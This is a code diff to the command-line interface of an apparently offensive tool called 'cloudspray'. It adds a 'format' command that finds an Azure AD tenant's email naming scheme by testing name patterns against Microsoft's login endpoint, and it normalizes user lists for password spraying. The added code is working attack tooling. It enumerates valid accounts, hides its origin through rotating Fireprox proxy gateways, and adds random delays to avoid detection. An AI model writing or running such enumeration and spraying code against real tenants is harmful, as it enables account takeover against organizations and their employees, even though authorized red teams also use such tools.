@@ -1,5 +1,6 @@
-"""Click CLI commands: enum, spray, post, report."""
+"""Click CLI commands: enum, spray, post, report, format."""
 
+import random
 import time
 
 import click
@@ -355,9 +356,9 @@ def spray_cmd(ctx, domain, users, passwords, password, delay, jitter,
         cfg.spray.shuffle_mode = shuffle
 
     from cloudspray.spray import Authenticator, SprayEngine
-    from cloudspray.utils import read_userlist, read_password_list
+    from cloudspray.utils import read_userlist, read_password_list, normalize_email
 
-    userlist = read_userlist(users)
+    userlist = [normalize_email(u, domain) for u in read_userlist(users)]
     if passwords:
         passlist = read_password_list(passwords)
     else:
@@ -485,3 +486,119 @@ def report_cmd(ctx, output_format, output):
     except Exception as exc:
         reporter.error(f"Report generation failed: {exc}")
         raise SystemExit(1) from exc
+
+
+# Common UPN format patterns. Each is a callable that takes (first, last)
+# and returns the local part (before @domain).
+_FORMAT_PATTERNS = {
+    "first.last":  lambda f, l: f"{f}.{l}",
+    "flast":       lambda f, l: f"{f[0]}{l}",
+    "firstl":      lambda f, l: f"{f}{l[0]}",
+    "firstlast":   lambda f, l: f"{f}{l}",
+    "lastfirst":   lambda f, l: f"{l}{f}",
+    "last.first":  lambda f, l: f"{l}.{f}",
+    "lfirst":      lambda f, l: f"{l[0]}{f}",
+    "first_last":  lambda f, l: f"{f}_{l}",
+    "first-last":  lambda f, l: f"{f}-{l}",
+    "first":       lambda f, l: f,
+    "last":        lambda f, l: l,
+}
+
+
+@cli.command("format")
+@click.option("-d", "--domain", required=True, help="Target domain.")
+@click.option(
+    "-n", "--names", required=True,
+    type=click.Path(exists=True),
+    help="File with full names (one per line, e.g. 'Thomas Cox').",
+)
+@click.pass_context
+def format_cmd(ctx, domain, names):
+    """Discover the UPN format used by an Azure AD tenant.
+
+    Takes a list of known employee names and tests common email format
+    patterns (first.last, flast, firstl, etc.) against the MSOL
+    GetCredentialType endpoint to find which format the org uses.
+    """
+    reporter = ctx.obj["reporter"]
+    cfg = ctx.obj["config"]
+
+    reporter.banner()
+
+    domain = _discover_tenant(domain, reporter)
+
+    from cloudspray.utils import read_lines
+
+    raw_names = read_lines(names)
+    parsed_names = []
+    for line in raw_names:
+        parts = line.strip().split()
+        if len(parts) < 2:
+            reporter.debug(f"Skipping line (need first + last): {line}")
+            continue
+        parsed_names.append((parts[0].lower(), parts[-1].lower()))
+
+    if not parsed_names:
+        reporter.error("No valid names found. File should have 'First Last' per line.")
+        raise SystemExit(1)
+
+    reporter.info(f"Testing {len(parsed_names)} name(s) against {len(_FORMAT_PATTERNS)} format patterns")
+
+    proxy_manager, proxy_session = _build_fireprox_session(
+        cfg, "login.microsoftonline.com", reporter,
+    )
+
+    try:
+        from cloudspray.enumerators import MSOLEnumerator
+
+        with StateDB(ctx.obj["db_path"]) as db:
+            enumerator = MSOLEnumerator(domain, db, reporter, proxy_session=proxy_session)
+
+            # Track which formats found valid users
+            format_hits: dict[str, list[str]] = {fmt: [] for fmt in _FORMAT_PATTERNS}
+
+            for first, last in parsed_names:
+                for fmt_name, fmt_fn in _FORMAT_PATTERNS.items():
+                    local_part = fmt_fn(first, last)
+                    email = f"{local_part}@{domain}"
+                    result = enumerator._check_user(email)
+
+                    if result is True:
+                        format_hits[fmt_name].append(email)
+                        reporter.info(f"[+] FOUND: {email}  (format: {fmt_name})")
+                    elif result is False:
+                        reporter.debug(f"[-] not found: {email}")
+                    else:
+                        reporter.debug(f"[?] ambiguous: {email}")
+
+                    time.sleep(random.uniform(1.0, 3.0))
+
+            # Summary
+            reporter.info("")
+            reporter.info("=== Format Discovery Results ===")
+            winning_formats = {
+                fmt: hits for fmt, hits in format_hits.items() if hits
+            }
+
+            if not winning_formats:
+                reporter.error("No formats matched any names. Try different names or check the domain.")
+            else:
+                for fmt, hits in sorted(winning_formats.items(), key=lambda x: -len(x[1])):
+                    reporter.info(f"  {fmt}: {len(hits)}/{len(parsed_names)} matched")
+                    for email in hits:
+                        reporter.info(f"    {email}")
+
+                best_format = max(winning_formats, key=lambda f: len(winning_formats[f]))
+                reporter.info(f"\nBest match: {best_format}")
+                reporter.info(f"Use this to build your user list: <username>@{domain}")
+                reporter.info(f"Pattern: {best_format} (e.g. {_FORMAT_PATTERNS[best_format]('john', 'smith')}@{domain})")
+
+    except (KeyboardInterrupt, SystemExit):
+        raise
+    except Exception as exc:
+        reporter.error(f"Format discovery failed: {exc}")
+        raise SystemExit(1) from exc
+    finally:
+        if proxy_manager is not None:
+            reporter.info("Tearing down Fireprox gateways")
+            proxy_manager.teardown_all()
